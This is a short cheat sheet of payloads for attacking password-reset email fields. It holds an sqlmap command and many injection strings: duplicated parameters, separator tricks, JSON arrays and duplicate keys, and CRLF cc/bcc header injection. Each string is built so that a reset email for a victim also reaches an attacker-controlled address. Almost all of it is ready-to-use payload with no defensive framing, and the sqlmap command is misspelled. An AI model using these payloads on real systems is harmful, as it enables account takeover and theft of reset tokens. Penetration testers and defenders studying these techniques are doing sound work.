#### Try sqlmap in the email parameter as backend involvement may occur 
````
sqlpmap -r pass_reset.txt -p email
````


#### Double parameter (aka. HPP / HTTP parameter pollution):
- email=victim@xyz.tld&email=hacker@xyz.tld
#### Carbon copy:
- email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
#### Using separators:
- email=victim@xyz.tld,hacker@xyz.tld
- email=victim@xyz.tld%20hacker@xyz.tld
- email=victim@xyz.tld|hacker@xyz.tld
#### No domain:
- email=victim
- email=victim@xyz
#### JSON table:
- {"email":["victim@xyz.tld","hacker@xyz.tld"]}

#### two JSON emails(comma separator)
````
{"email":"victim@mail.com","email":"attacker@mail.com"}
````
#### Exploiting $to parameter in SMTP header injection
- using semicolon separator
````
{"email":"Victim@gmail.com;Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com;Attacker@gmail.com"}
````
- using SPACE separator
````
{"email":"Victim@gmail.com%20Attacker@gmail.com","email":"Victim@gmail.com"}
{"email":"Victim@gmail.com","email":"Victim@gmail.com%20Attacker@gmail.com"}
````
#### CRLF Injection
- In Unix system(\n url encoded)

using carbon copy
````
{"email":"Victim@mail.com%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
{"email":"Victim@mail.com","email":"Victim@mail.com%0Acc:Attacker@mail.com"}
````
using blind carbon copy
 ````
 {"email": "Victim@mail.com%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
 {"email":"Victim@mail.com","email":"Victim@mail.com%0Abcc:Attacker@mail.com"}
 ````
- In Windows system(\r\n)
 
 using carbon copy
 ````
 {"email":"Victim@mail.com%0D%0Acc:Attacker@mail.com","email":"Victim@mail.com"}
 {"email":"Victim@mail.com","email":"Victim@mail.com%0D%0Acc:Attacker@mail.com"}
 ````
 using blind carbon copy 
 ````
 {"email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com","email":"Victim@mail.com"}
 {"email":"Victim@mail.com","email": "Victim@mail.com%0D%0Abcc:Attacker@mail.com"}
 ````

